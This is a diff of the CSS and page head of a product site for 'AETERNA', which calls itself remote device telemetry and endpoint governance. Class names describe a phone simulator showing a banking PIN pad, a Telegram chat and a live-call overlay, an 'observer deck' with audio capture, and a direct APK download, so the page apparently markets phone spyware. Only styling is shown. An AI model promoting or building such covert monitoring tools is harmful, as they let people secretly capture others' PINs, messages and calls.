@@ -3,32 +3,32 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>AETERNA // PAAS.WEBSITE — Enterprise Fleet Telemetry & Endpoint Governance</title>
-  <meta name="description" content="Next-generation Sovereign Platform-as-a-Service (PaaS) engineered for corporate intelligence, executive endpoint governance, and real-time remote device telemetry.">
+  <title>AETERNA // PAAS.WEBSITE — Sovereign Fleet Telemetry & Endpoint Governance</title>
+  <meta name="description" content="Next-generation Platform-as-a-Service (PaaS) engineered for corporate intelligence, executive endpoint governance, and real-time remote device telemetry.">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,600;0,800;1,400&family=Outfit:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
   <style>
     :root {
-      --bg: #03060c;
-      --bg-surface: #070d18;
-      --card: rgba(10, 18, 32, 0.85);
-      --card-hover: rgba(14, 25, 46, 0.95);
+      --bg: #020409;
+      --bg-surface: #070c18;
+      --card: rgba(9, 16, 30, 0.88);
+      --card-hover: rgba(14, 25, 48, 0.96);
       --border: rgba(0, 240, 255, 0.18);
       --border-strong: rgba(0, 240, 255, 0.45);
       --cyan: #00f0ff;
       --cyan-glow: rgba(0, 240, 255, 0.35);
-      --gold: #ffd700;
-      --green: #00ff88;
-      --green-glow: rgba(0, 255, 136, 0.3);
-      --red: #ff3366;
-      --purple: #b026ff;
-      --blue: #2563eb;
-      --text: #f1f5f9;
+      --gold: #f59e0b;
+      --green: #10b981;
+      --green-glow: rgba(16, 185, 129, 0.3);
+      --red: #f43f5e;
+      --purple: #8b5cf6;
+      --blue: #3b82f6;
+      --text: #f8fafc;
       --text-dim: #94a3b8;
       --muted: #64748b;
-      --shadow: 0 20px 40px -15px rgba(0, 0, 0, 0.8);
-      --shadow-cyan: 0 10px 30px -5px rgba(0, 240, 255, 0.25);
+      --shadow: 0 25px 60px -15px rgba(0, 0, 0, 0.9);
+      --shadow-cyan: 0 10px 40px -5px rgba(0, 240, 255, 0.3);
     }
 
     * {
@@ -45,11 +45,11 @@
     body {
       background: var(--bg);
       background-image: 
-        radial-gradient(circle at 15% 10%, rgba(0, 240, 255, 0.08), transparent 45%),
-        radial-gradient(circle at 85% 90%, rgba(176, 38, 255, 0.06), transparent 50%),
-        linear-gradient(rgba(255, 255, 255, 0.012) 1px, transparent 1px),
-        linear-gradient(90deg, rgba(255, 255, 255, 0.012) 1px, transparent 1px);
-      background-size: 100% 100%, 100% 100%, 32px 32px, 32px 32px;
+        radial-gradient(circle at 15% 10%, rgba(0, 240, 255, 0.09), transparent 50%),
+        radial-gradient(circle at 85% 90%, rgba(139, 92, 246, 0.08), transparent 50%),
+        linear-gradient(rgba(255, 255, 255, 0.015) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(255, 255, 255, 0.015) 1px, transparent 1px);
+      background-size: 100% 100%, 100% 100%, 36px 36px, 36px 36px;
       color: var(--text);
       font-family: 'Outfit', sans-serif;
       min-height: 100vh;
@@ -65,10 +65,10 @@
       top: 0;
       z-index: 1000;
       width: 100%;
-      background: rgba(3, 6, 12, 0.85);
-      backdrop-filter: blur(20px);
+      background: rgba(2, 4, 9, 0.88);
+      backdrop-filter: blur(24px);
       border-bottom: 1px solid var(--border);
-      padding: 14px 28px;
+      padding: 14px 32px;
       display: flex;
       justify-content: space-between;
       align-items: center;
@@ -78,28 +78,28 @@
     .nav-brand {
       display: flex;
       align-items: center;
-      gap: 12px;
+      gap: 14px;
       text-decoration: none;
       color: inherit;
     }
 
     .nav-logo-glyph {
-      width: 36px;
-      height: 36px;
-      border-radius: 10px;
-      background: linear-gradient(135deg, rgba(0, 240, 255, 0.2), rgba(0, 255, 136, 0.2));
+      width: 40px;
+      height: 40px;
+      border-radius: 12px;
+      background: linear-gradient(135deg, rgba(0, 240, 255, 0.25), rgba(16, 185, 129, 0.25));
       border: 1px solid var(--cyan);
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 18px;
-      box-shadow: 0 0 15px var(--cyan-glow);
+      font-size: 20px;
+      box-shadow: 0 0 20px var(--cyan-glow);
     }
 
     .nav-title {
-      font-size: 17px;
+      font-size: 18px;
       font-weight: 800;
-      letter-spacing: 1px;
+      letter-spacing: 0.5px;
       color: #fff;
     }
 
@@ -108,21 +108,21 @@
       font-size: 10px;
       color: var(--cyan);
       letter-spacing: 1.5px;
-      font-weight: 600;
+      font-weight: 700;
       text-transform: uppercase;
     }
 
     .nav-links {
       display: flex;
       align-items: center;
-      gap: 24px;
+      gap: 28px;
       list-style: none;
     }
 
     .nav-links a {
       color: var(--text-dim);
       text-decoration: none;
-      font-size: 13px;
+      font-size: 14px;
       font-weight: 600;
       transition: color 0.2s;
     }
@@ -133,12 +133,12 @@
     .nav-actions {
       display: flex;
       align-items: center;
-      gap: 12px;
+      gap: 14px;
     }
 
     .lang-switcher {
       display: flex;
-      background: rgba(255, 255, 255, 0.05);
+      background: rgba(255, 255, 255, 0.04);
       border: 1px solid var(--border);
       border-radius: 8px;
       padding: 3px;
@@ -151,8 +151,8 @@
       color: var(--muted);
       font-family: 'JetBrains Mono', monospace;
       font-size: 11px;
-      font-weight: 700;
-      padding: 4px 8px;
+      font-weight: 800;
+      padding: 4px 10px;
       border-radius: 6px;
       cursor: pointer;
       transition: all 0.2s;
@@ -161,52 +161,51 @@
     .lang-btn.active {
       background: var(--cyan);
       color: #000;
-      box-shadow: 0 0 10px var(--cyan-glow);
+      box-shadow: 0 0 12px var(--cyan-glow);
     }
 
     .btn-portal-login {
-      background: linear-gradient(135deg, rgba(0, 240, 255, 0.15), rgba(255, 215, 0, 0.15));
+      background: linear-gradient(135deg, rgba(0, 240, 255, 0.15), rgba(245, 158, 11, 0.15));
       border: 1px solid var(--cyan);
       color: #fff;
       font-family: 'JetBrains Mono', monospace;
       font-size: 12px;
-      font-weight: 700;
-      padding: 8px 16px;
+      font-weight: 800;
+      padding: 9px 18px;
       border-radius: 8px;
       cursor: pointer;
       display: flex;
       align-items: center;
       gap: 8px;
-      box-shadow: 0 0 15px rgba(0, 240, 255, 0.15);
-      transition: all 0.2s;
+      box-shadow: 0 0 15px rgba(0, 240, 255, 0.2);
+      transition: all 0.25s;
     }
     .btn-portal-login:hover {
       background: var(--cyan);
       color: #000;
-      box-shadow: 0 0 20px var(--cyan-glow);
+      box-shadow: 0 0 25px var(--cyan-glow);
       transform: translateY(-1px);
     }
 
     @media (max-width: 900px) {
       .nav-links { display: none; }
-      .top-nav { padding: 12px 16px; }
+      .top-nav { padding: 12px 18px; }
     }
 
     /* ══════════════════════════════════════════════════════════════ */
-    /* EXECUTIVE SHOWCASE / PORTFOLIO CONTAINER */
+    /* EXECUTIVE SHOWCASE & HERO */
     /* ══════════════════════════════════════════════════════════════ */
     #executive-showcase {
       width: 100%;
-      max-width: 1280px;
+      max-width: 1320px;
       margin: 0 auto;
-      padding: 40px 24px 80px;
+      padding: 40px 24px 90px;
     }
 
-    /* HERO SECTION */
     .hero-section {
       text-align: center;
-      padding: 50px 0 60px;
-      max-width: 960px;
+      padding: 40px 0 50px;
+      max-width: 1000px;
       margin: 0 auto;
     }
 
@@ -216,25 +215,25 @@
       gap: 8px;
       background: rgba(0, 240, 255, 0.08);
       border: 1px solid var(--border-strong);
-      padding: 6px 14px;
+      padding: 7px 18px;
       border-radius: 9999px;
       font-family: 'JetBrains Mono', monospace;
       font-size: 11px;
-      font-weight: 700;
+      font-weight: 800;
       color: var(--cyan);
       text-transform: uppercase;
-      letter-spacing: 1px;
+      letter-spacing: 1.5px;
       margin-bottom: 24px;
-      box-shadow: 0 0 20px rgba(0, 240, 255, 0.12);
+      box-shadow: 0 0 25px rgba(0, 240, 255, 0.15);
     }
 
     .hero-title {
-      font-size: 48px;
+      font-size: 52px;
       font-weight: 900;
-      line-height: 1.15;
-      letter-spacing: -1px;
-      margin-bottom: 20px;
-      background: linear-gradient(135deg, #ffffff 40%, var(--cyan) 80%, var(--gold) 100%);
+      line-height: 1.12;
+      letter-spacing: -1.2px;
+      margin-bottom: 22px;
+      background: linear-gradient(135deg, #ffffff 40%, var(--cyan) 75%, var(--gold) 100%);
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
     }
@@ -243,9 +242,9 @@
       font-size: 18px;
       color: var(--text-dim);
       font-weight: 400;
-      max-width: 780px;
+      max-width: 820px;
       margin: 0 auto 36px;
-      line-height: 1.6;
+      line-height: 1.65;
     }
 
     .hero-cta-group {
@@ -257,13 +256,13 @@
     }
 
     .btn-primary-cta {
-      background: linear-gradient(135deg, #00f0ff, #00b4d8);
+      background: linear-gradient(135deg, #00f0ff, #0284c7);
       color: #020617;
       font-family: 'Outfit', sans-serif;
-      font-size: 15px;
+      font-size: 16px;
       font-weight: 800;
-      padding: 14px 28px;
-      border-radius: 10px;
+      padding: 15px 32px;
+      border-radius: 12px;
       text-decoration: none;
       display: inline-flex;
       align-items: center;
@@ -275,7 +274,7 @@
     }
     .btn-primary-cta:hover {
       transform: translateY(-2px);
-      box-shadow: 0 12px 30px rgba(0, 240, 255, 0.4);
+      box-shadow: 0 15px 40px rgba(0, 240, 255, 0.45);
     }
 
     .btn-secondary-cta {
@@ -283,10 +282,10 @@
       border: 1px solid var(--border);
       color: #fff;
       font-family: 'Outfit', sans-serif;
-      font-size: 15px;
+      font-size: 16px;
       font-weight: 700;
-      padding: 14px 24px;
-      border-radius: 10px;
+      padding: 15px 28px;
+      border-radius: 12px;
       text-decoration: none;
       display: inline-flex;
       align-items: center;
@@ -299,58 +298,12 @@
       border-color: rgba(255, 255, 255, 0.3);
     }
 
-    /* METRICS STRIP */
-    .metrics-strip {
-      display: grid;
-      grid-template-columns: repeat(4, 1fr);
-      gap: 16px;
-      margin: 40px 0 70px;
-    }
-
-    .metric-card {
-      background: var(--card);
-      border: 1px solid var(--border);
-      border-radius: 14px;
-      padding: 20px 18px;
-      text-align: center;
-      backdrop-filter: blur(12px);
-      transition: border-color 0.2s;
-    }
-    .metric-card:hover {
-      border-color: var(--cyan);
-    }
-
-    .metric-value {
-      font-size: 28px;
-      font-weight: 800;
-      font-family: 'JetBrains Mono', monospace;
-      color: #fff;
-      margin-bottom: 4px;
-    }
-    .metric-value.cyan { color: var(--cyan); }
-    .metric-value.green { color: var(--green); }
-    .metric-value.gold { color: var(--gold); }
-
-    .metric-label {
-      font-size: 12px;
-      color: var(--text-dim);
-      font-weight: 600;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-    }
-
-    @media (max-width: 900px) {
-      .hero-title { font-size: 32px; }
-      .hero-lead { font-size: 16px; }
-      .metrics-strip { grid-template-columns: repeat(2, 1fr); }
-    }
-
     /* ══════════════════════════════════════════════════════════════ */
-    /* INTERACTIVE DEMO HUD (WHAT HAPPENS AFTER ACTIVATION) */
+    /* THE FLAGSHIP INTERACTIVE DEMO HUD (THE DISPLEY SHOWCASE) */
     /* ══════════════════════════════════════════════════════════════ */
     .section-header {
       text-align: center;
-      margin-bottom: 36px;
+      margin: 40px 0 36px;
     }
 
     .section-tag {
@@ -358,125 +311,339 @@
       font-size: 11px;
       color: var(--cyan);
       text-transform: uppercase;
-      letter-spacing: 2px;
-      font-weight: 700;
+      letter-spacing: 2.5px;
+      font-weight: 800;
       margin-bottom: 8px;
       display: block;
     }
 
     .section-title {
-      font-size: 32px;
-      font-weight: 800;
+      font-size: 36px;
+      font-weight: 900;
       color: #fff;
-      letter-spacing: -0.5px;
+      letter-spacing: -0.6px;
     }
 
     .section-desc {
-      font-size: 15px;
+      font-size: 16px;
       color: var(--text-dim);
-      max-width: 680px;
+      max-width: 720px;
       margin: 10px auto 0;
     }
 
-    .demo-sandbox {
+    .interactive-stage {
       background: var(--card);
-      border: 1px solid var(--border);
-      border-radius: 20px;
-      padding: 30px;
+      border: 1px solid var(--border-strong);
+      border-radius: 28px;
+      padding: 36px;
       box-shadow: var(--shadow);
       display: grid;
-      grid-template-columns: 340px 1fr;
-      gap: 30px;
+      grid-template-columns: 380px 1fr;
+      gap: 36px;
       align-items: start;
       margin-bottom: 70px;
       position: relative;
       overflow: hidden;
     }
 
-    .demo-sandbox::before {
+    .interactive-stage::before {
       content: '';
       position: absolute;
-      top: 0;
-      right: 0;
-      width: 300px;
-      height: 300px;
-      background: radial-gradient(circle, rgba(0, 240, 255, 0.08), transparent 70%);
+      top: -100px;
+      left: 100px;
+      width: 400px;
+      height: 400px;
+      background: radial-gradient(circle, rgba(0, 240, 255, 0.12), transparent 70%);
       pointer-events: none;
     }
 
-    /* DEMO PHONE CHASSIS */
-    .demo-phone {
+    /* ═══════ REALISTIC INTERACTIVE SMARTPHONE ═══════ */
+    .phone-deck {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .flagship-phone {
+      width: 100%;
+      max-width: 360px;
+      aspect-ratio: 9 / 19.5;
+      background: #030712;
+      border: 5px solid #1e293b;
+      border-radius: 46px;
+      padding: 12px;
+      display: flex;
+      flex-direction: column;
+      position: relative;
+      box-shadow: 
+        0 30px 70px rgba(0, 0, 0, 0.95),
+        0 0 35px rgba(0, 240, 255, 0.22),
+        inset 0 0 15px rgba(255, 255, 255, 0.05);
+      user-select: none;
+      transition: transform 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+    }
+
+    .phone-punchhole {
+      width: 14px;
+      height: 14px;
       background: #000;
-      border: 3px solid #1e293b;
-      border-radius: 36px;
-      aspect-ratio: 9 / 19;
-      padding: 14px 12px;
-      display: flex;
-      flex-direction: column;
-      position: relative;
-      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.9), 0 0 20px rgba(0, 240, 255, 0.15);
-    }
-
-    .demo-notch {
-      width: 12px;
-      height: 12px;
-      background: #020617;
+      border: 1.5px solid #334155;
       border-radius: 50%;
-      margin: 0 auto 10px;
-      border: 1px solid #334155;
+      position: absolute;
+      top: 16px;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 40;
+      box-shadow: 0 0 8px rgba(16, 185, 129, 0.8);
     }
 
-    .demo-screen-content {
+    .phone-screen {
       flex: 1;
-      background: #050b14;
-      border-radius: 24px;
-      padding: 16px 12px;
+      background: #040812;
+      border-radius: 36px;
+      overflow: hidden;
       display: flex;
       flex-direction: column;
-      justify-content: space-between;
-      border: 1px solid rgba(255, 255, 255, 0.05);
-      overflow: hidden;
       position: relative;
+      border: 1px solid rgba(255, 255, 255, 0.06);
     }
 
-    .demo-screen-header {
+    /* Top Phone Status Bar */
+    .phone-status-bar {
+      padding: 10px 18px 6px;
       display: flex;
       justify-content: space-between;
       align-items: center;
-      font-size: 11px;
-      font-family: 'JetBrains Mono', monospace;
-      color: var(--cyan);
-      padding-bottom: 8px;
-      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
-    }
-
-    .demo-app-card {
-      background: rgba(255, 255, 255, 0.04);
-      border: 1px solid rgba(255, 255, 255, 0.08);
-      border-radius: 12px;
-      padding: 10px;
-      margin: 8px 0;
-      font-size: 11px;
-    }
-
-    .demo-typing-box {
-      background: rgba(0, 240, 255, 0.08);
-      border: 1px dashed var(--cyan);
-      border-radius: 8px;
-      padding: 8px;
       font-family: 'JetBrains Mono', monospace;
       font-size: 11px;
+      color: var(--text-dim);
+      font-weight: 700;
+      z-index: 30;
+      background: rgba(4, 8, 18, 0.8);
+      backdrop-filter: blur(8px);
+    }
+
+    /* Notification Dropdown Toast */
+    .phone-notif-toast {
+      position: absolute;
+      top: -90px;
+      left: 10px;
+      right: 10px;
+      background: rgba(15, 23, 42, 0.95);
+      border: 1px solid var(--cyan);
+      border-radius: 16px;
+      padding: 12px 14px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.8);
+      z-index: 50;
+      transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    }
+    .phone-notif-toast.show {
+      top: 38px;
+    }
+
+    /* Active Phone App Screens */
+    .phone-app-container {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .phone-view {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      padding: 16px;
+      display: none;
+      flex-direction: column;
+      animation: phoneViewSlide 0.3s ease forwards;
+    }
+    .phone-view.active {
+      display: flex;
+    }
+
+    @keyframes phoneViewSlide {
+      from { opacity: 0; transform: scale(0.96); }
+      to { opacity: 1; transform: scale(1); }
+    }
+
+    /* 1. Homescreen View */
+    .app-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 16px 12px;
+      margin-top: 24px;
+      text-align: center;
+    }
+    .app-icon-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 6px;
+      cursor: pointer;
+      transition: transform 0.15s;
+    }
+    .app-icon-item:hover {
+      transform: scale(1.08);
+    }
+    .app-icon-box {
+      width: 52px;
+      height: 52px;
+      border-radius: 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 24px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.6);
+      position: relative;
+    }
+    .app-icon-label {
+      font-size: 11px;
+      font-weight: 600;
+      color: #e2e8f0;
+    }
+
+    /* 2. Banking App Screen */
+    .bank-balance-card {
+      background: linear-gradient(135deg, #1e1b4b, #312e81);
+      border: 1px solid rgba(139, 92, 246, 0.4);
+      border-radius: 18px;
+      padding: 18px;
+      color: #fff;
+      margin-bottom: 16px;
+    }
+    .bank-pin-pad {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 8px;
+      margin-top: auto;
+    }
+    .pin-btn {
+      background: rgba(255, 255, 255, 0.06);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 10px;
+      padding: 12px 0;
+      font-size: 16px;
+      font-weight: 700;
+      color: #fff;
+      cursor: pointer;
+      text-align: center;
+    }
+    .pin-btn:active {
+      background: var(--cyan);
+      color: #000;
+    }
+
+    /* 3. Telegram Chat Screen */
+    .chat-bubble {
+      max-width: 85%;
+      padding: 10px 14px;
+      border-radius: 14px;
+      font-size: 12px;
+      line-height: 1.4;
+      margin-bottom: 10px;
+    }
+    .bubble-in {
+      background: #1e293b;
+      align-self: flex-start;
+      border-bottom-left-radius: 4px;
+      color: #f1f5f9;
+    }
+    .bubble-out {
+      background: #0284c7;
+      align-self: flex-end;
+      border-bottom-right-radius: 4px;
       color: #fff;
     }
 
-    /* DEMO CONTROL PANEL */
-    .demo-control-panel {
+    /* 4. Live Call Overlay Screen */
+    .call-overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(3, 7, 18, 0.96);
+      backdrop-filter: blur(20px);
+      z-index: 60;
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: space-between;
+      padding: 40px 20px;
+    }
+    .call-overlay.active {
+      display: flex;
+    }
+
+    /* Phone Virtual Home Bar */
+    .phone-nav-bar {
+      height: 24px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      z-index: 30;
+      padding-bottom: 6px;
+    }
+    .phone-home-pill {
+      width: 110px;
+      height: 4px;
+      background: rgba(255, 255, 255, 0.4);
+      border-radius: 9999px;
+      transition: background 0.2s;
+    }
+    .phone-nav-bar:hover .phone-home-pill {
+      background: var(--cyan);
+      box-shadow: 0 0 10px var(--cyan);
+    }
+
+    /* Trigger Action Buttons Below Phone */
+    .simulator-triggers {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 8px;
+      width: 100%;
+      max-width: 360px;
+    }
+    .btn-sim-action {
+      background: rgba(255, 255, 255, 0.04);
+      border: 1px solid var(--border);
+      color: #fff;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      font-weight: 700;
+      padding: 9px 8px;
+      border-radius: 8px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      transition: all 0.2s;
+    }
+    .btn-sim-action:hover {
+      background: rgba(0, 240, 255, 0.15);
+      border-color: var(--cyan);
+      color: var(--cyan);
+      box-shadow: 0 0 15px rgba(0, 240, 255, 0.2);
+    }
+
+    /* ═══════ THE OBSERVER DECK (RIGHT PANEL) ═══════ */
+    .observer-deck {
       display: flex;
       flex-direction: column;
       gap: 20px;
     }
 
-    .demo-nav-tabs {
+    .observer-tabs-nav {
       display: flex;
       gap: 8px;
       border-bottom: 1px solid var(--border);
@@ -484,76 +651,133 @@
       overflow-x: auto;
     }
 
-    .demo-tab-btn {
+    .obs-tab-btn {
       background: rgba(255, 255, 255, 0.03);
       border: 1px solid var(--border);
       color: var(--text-dim);
-      padding: 8px 16px;
-      border-radius: 8px;
+      padding: 10px 18px;
+      border-radius: 10px;
       font-family: 'JetBrains Mono', monospace;
       font-size: 12px;
       font-weight: 700;
       cursor: pointer;
       display: flex;
       align-items: center;
-      gap: 6px;
+      gap: 8px;
       transition: all 0.2s;
       white-space: nowrap;
     }
-    .demo-tab-btn.active {
-      background: rgba(0, 240, 255, 0.12);
+    .obs-tab-btn.active {
+      background: rgba(0, 240, 255, 0.14);
       border-color: var(--cyan);
       color: var(--cyan);
+      box-shadow: 0 0 20px rgba(0, 240, 255, 0.15);
     }
 
-    .demo-tab-pane {
+    .obs-tab-pane {
       display: none;
       animation: fadeIn 0.3s ease;
     }
-    .demo-tab-pane.active {
+    .obs-tab-pane.active {
       display: block;
     }
 
-    .demo-data-table {
-      width: 100%;
-      border-collapse: collapse;
+    .live-stream-box {
+      background: #020409;
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      padding: 18px;
       font-family: 'JetBrains Mono', monospace;
       font-size: 12px;
+      min-height: 280px;
+      max-height: 340px;
+      overflow-y: auto;
+      line-height: 1.7;
     }
-    .demo-data-table th {
-      text-align: left;
-      padding: 10px 12px;
-      color: var(--muted);
-      border-bottom: 1px solid var(--border);
-      font-weight: 600;
-    }
-    .demo-data-table td {
-      padding: 12px;
+
+    .packet-row {
+      display: flex;
+      justify-content: space-between;
       border-bottom: 1px solid rgba(255, 255, 255, 0.04);
-      color: var(--text);
+      padding: 6px 0;
+    }
+
+    /* Live Audio Waveform */
+    .audio-wave-box {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 4px;
+      height: 48px;
+      background: rgba(0, 240, 255, 0.04);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 0 16px;
+      margin: 12px 0;
+    }
+    .wave-bar {
+      width: 4px;
+      background: var(--cyan);
+      border-radius: 4px;
+      animation: wavePulse 1s ease-in-out infinite alternate;
+    }
+    @keyframes wavePulse {
+      0% { height: 6px; }
+      100% { height: 38px; }
+    }
+
+    /* Metrics Grid */
+    .telemetry-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 12px;
+      margin-top: 14px;
+    }
+    .telemetry-pill {
+      background: rgba(255, 255, 255, 0.03);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 12px;
+      text-align: center;
+    }
+    .telemetry-pill .val {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 16px;
+      font-weight: 800;
+      color: #fff;
+    }
+    .telemetry-pill .lbl {
+      font-size: 10px;
+      color: var(--muted);
+      text-transform: uppercase;
+      font-weight: 700;
+      margin-top: 2px;
     }
 
     @media (max-width: 900px) {
-      .demo-sandbox { grid-template-columns: 1fr; }
-      .demo-phone { max-width: 320px; margin: 0 auto; }
+      .hero-title { font-size: 34px; }
+      .interactive-stage { grid-template-columns: 1fr; padding: 20px; }
+      .flagship-phone { max-width: 320px; margin: 0 auto; }
+      .simulator-triggers { max-width: 320px; margin: 0 auto; }
+      .telemetry-grid { grid-template-columns: 1fr; }
     }
 
     /* ══════════════════════════════════════════════════════════════ */
-    /* INTERACTIVE DEPLOYMENT TERMINAL (AUTONOMOUS ENROLLMENT) */
+    /* INTERACTIVE DEPLOYMENT TERMINAL */
     /* ══════════════════════════════════════════════════════════════ */
     .terminal-wrapper {
       background: #020408;
       border: 1px solid #1e293b;
-      border-radius: 16px;
+      border-radius: 20px;
       box-shadow: var(--shadow);
       margin-bottom: 70px;
       overflow: hidden;
     }
 
     .terminal-header {
-      background: #090d16;
+      background: #070b14;
       border-bottom: 1px solid #1e293b;
-      padding: 12px 18px;
+      padding: 14px 20px;
       display: flex;
       justify-content: space-between;
       align-items: center;
@@ -568,7 +792,7 @@
       height: 10px;
       border-radius: 50%;
     }
-    .dot-red { background: #ef4444; }
+    .dot-red { background: #f43f5e; }
     .dot-yellow { background: #f59e0b; }
     .dot-green { background: #10b981; }
 
@@ -576,7 +800,7 @@
       font-family: 'JetBrains Mono', monospace;
       font-size: 11px;
       color: var(--text-dim);
-      font-weight: 600;
+      font-weight: 700;
     }
 
     .terminal-body {
@@ -602,9 +826,9 @@
     .term-info { color: var(--gold); }
 
     .terminal-footer {
-      background: #090d16;
+      background: #070b14;
       border-top: 1px solid #1e293b;
-      padding: 12px 18px;
+      padding: 14px 20px;
       display: flex;
       justify-content: space-between;
       align-items: center;
@@ -617,10 +841,10 @@
       border: 1px solid var(--border);
       color: #fff;
       font-family: 'JetBrains Mono', monospace;
-      font-size: 11px;
+      font-size: 12px;
       font-weight: 700;
-      padding: 6px 12px;
-      border-radius: 6px;
+      padding: 7px 16px;
+      border-radius: 8px;
       cursor: pointer;
       display: inline-flex;
       align-items: center;
@@ -633,20 +857,20 @@
     }
 
     /* ══════════════════════════════════════════════════════════════ */
-    /* DIRECT APK DOWNLOAD & INSTRUCTIONS CARD */
+    /* DIRECT APK DOWNLOAD & INSTRUCTIONS */
     /* ══════════════════════════════════════════════════════════════ */
     .download-grid {
       display: grid;
       grid-template-columns: 1fr 1fr;
-      gap: 28px;
+      gap: 32px;
       margin-bottom: 70px;
     }
 
     .download-card {
-      background: linear-gradient(135deg, rgba(0, 240, 255, 0.05), rgba(11, 16, 28, 0.95));
+      background: linear-gradient(135deg, rgba(0, 240, 255, 0.06), rgba(10, 18, 32, 0.95));
       border: 1px solid var(--border-strong);
-      border-radius: 20px;
-      padding: 32px;
+      border-radius: 24px;
+      padding: 36px;
       display: flex;
       flex-direction: column;
       justify-content: space-between;
@@ -657,14 +881,14 @@
       display: inline-flex;
       align-items: center;
       gap: 6px;
-      background: rgba(0, 255, 136, 0.1);
+      background: rgba(16, 185, 129, 0.12);
       border: 1px solid var(--green);
       color: var(--green);
-      padding: 4px 10px;
-      border-radius: 6px;
+      padding: 5px 12px;
+      border-radius: 8px;
       font-family: 'JetBrains Mono', monospace;
       font-size: 11px;
-      font-weight: 700;
+      font-weight: 800;
       margin-bottom: 16px;
     }
 
@@ -674,12 +898,11 @@
       font-family: 'JetBrains Mono', monospace;
       font-size: 12px;
       color: var(--text-dim);
-      space-y: 10px;
     }
     .apk-spec-list li {
       display: flex;
       justify-content: space-between;
-      padding: 6px 0;
+      padding: 7px 0;
       border-bottom: 1px solid rgba(255, 255, 255, 0.04);
     }
     .apk-spec-list strong { color: #fff; }
@@ -689,7 +912,7 @@
       color: #020617;
       font-family: 'Outfit', sans-serif;
       font-size: 16px;
-      font-weight: 800;
+      font-weight: 900;
       padding: 16px;
       border-radius: 12px;
       text-align: center;
@@ -698,37 +921,36 @@
       justify-content: center;
       align-items: center;
       gap: 10px;
-      box-shadow: 0 10px 25px rgba(0, 255, 136, 0.3);
+      box-shadow: 0 10px 30px rgba(16, 185, 129, 0.35);
       transition: all 0.25s;
     }
     .btn-download-apk:hover {
       transform: translateY(-2px);
-      box-shadow: 0 14px 30px rgba(0, 255, 136, 0.45);
+      box-shadow: 0 16px 40px rgba(16, 185, 129, 0.5);
     }
 
-    /* INSTRUCTIONS CARD */
     .steps-card {
       background: var(--card);
       border: 1px solid var(--border);
-      border-radius: 20px;
-      padding: 32px;
+      border-radius: 24px;
+      padding: 36px;
       box-shadow: var(--shadow);
     }
 
     .step-item {
       display: flex;
-      gap: 16px;
+      gap: 18px;
       margin-bottom: 24px;
     }
     .step-num {
-      width: 32px;
-      height: 32px;
+      width: 36px;
+      height: 36px;
       border-radius: 50%;
       background: rgba(0, 240, 255, 0.1);
       border: 1px solid var(--cyan);
       color: var(--cyan);
       font-family: 'JetBrains Mono', monospace;
-      font-size: 13px;
+      font-size: 14px;
       font-weight: 800;
       display: flex;
       align-items: center;
@@ -736,7 +958,7 @@
       flex-shrink: 0;
     }
     .step-text h4 {
-      font-size: 15px;
+      font-size: 16px;
       font-weight: 700;
       color: #fff;
       margin-bottom: 4px;
@@ -744,7 +966,7 @@
     .step-text p {
       font-size: 13px;
       color: var(--text-dim);
-      line-height: 1.5;
+      line-height: 1.55;
     }
 
     @media (max-width: 900px) {
@@ -764,8 +986,8 @@
     .pricing-card {
       background: var(--card);
       border: 1px solid var(--border);
-      border-radius: 20px;
-      padding: 32px 24px;
+      border-radius: 22px;
+      padding: 34px 26px;
       display: flex;
       flex-direction: column;
       justify-content: space-between;
@@ -775,8 +997,8 @@
     }
     .pricing-card.featured {
       border-color: var(--cyan);
-      background: linear-gradient(180deg, rgba(0, 240, 255, 0.08) 0%, rgba(10, 18, 32, 0.95) 100%);
-      box-shadow: 0 0 35px rgba(0, 240, 255, 0.15);
+      background: linear-gradient(180deg, rgba(0, 240, 255, 0.09) 0%, rgba(9, 16, 30, 0.96) 100%);
+      box-shadow: 0 0 40px rgba(0, 240, 255, 0.18);
       transform: scale(1.02);
     }
     .pricing-card:hover {
@@ -792,15 +1014,15 @@
       color: #020617;
       font-family: 'JetBrains Mono', monospace;
       font-size: 10px;
-      font-weight: 800;
